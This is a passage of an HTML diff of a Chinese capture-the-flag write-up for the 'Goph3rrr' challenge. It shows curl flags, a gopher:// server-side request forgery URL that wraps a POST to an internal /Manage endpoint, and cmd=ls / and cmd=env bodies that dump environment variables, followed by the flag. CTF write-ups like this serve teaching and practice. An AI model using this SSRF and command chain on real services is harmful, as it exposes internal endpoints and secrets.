+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>-s                静默模式：不打印进度条和错误信息
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>-G                把后面 --data 的内容拼到 URL 的 query 上，而不是发 body
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>--data-urlencode  对内容做 URL 编码后再拼（等价于 ?url=&lt;编码后的值&gt;）
 </span></code></pre></div>
 <p><strong>等价于：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>GET /Gopher?url=gopher%3A%2F%2F0.0.0.0%3A8000%2F_...
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>GET /Gopher?url=gopher%3A%2F%2F0.0.0.0%3A8000%2F_...
 </span></code></pre></div>
 <h4 id="step-8-ls"><a class="toclink" href="../../ghctf2025-goph3rrr/#step-8-ls">Step 8：先 <code>ls</code>，再去环境变量里找</a></h4>
 <p><strong>第一次 <code>cmd=ls /</code>，根目录里没有 flag。</strong></p>
 <p><strong>那就看环境变量——把 body 换成 <code>cmd=env</code>：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="n">body</span> <span class="o">=</span> <span class="s2">"cmd=env"</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">body</span> <span class="o">=</span> <span class="s2">"cmd=env"</span>
 </span></code></pre></div>
 <p><strong>flag 直接躺在环境变量里：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>NSSCTF{089a7252-3c62-440e-baea-7993e4897f61}
 </span></code></pre></div>
 <hr />
 <table>
@@ -4177,15 +4209,15 @@
 <hr />
 <details class="note">
 <summary>完整请求</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>GET /Gopher?url=&lt;urlencode(gopher://0.0.0.0:8000/_&lt;urlencode(HTTP报文)&gt;)&gt;
-</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>
-</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>内层报文：
-</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>POST /Manage HTTP/1.1\r\n
-</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>Host: 127.0.0.1:8000\r\n
-</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>Content-Type: application/x-www-form-urlencoded\r\n
-</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>Content-Length: 8\r\n
-</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>\r\n
-</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>cmd=env
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>GET /Gopher?url=&lt;urlencode(gopher://0.0.0.0:8000/_&lt;urlencode(HTTP报文)&gt;)&gt;
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>内层报文：
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>POST /Manage HTTP/1.1\r\n
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>Host: 127.0.0.1:8000\r\n
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>Content-Type: application/x-www-form-urlencoded\r\n
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>Content-Length: 8\r\n
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>\r\n
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>cmd=env
 </span></code></pre></div>
 </details>
 <details class="note">
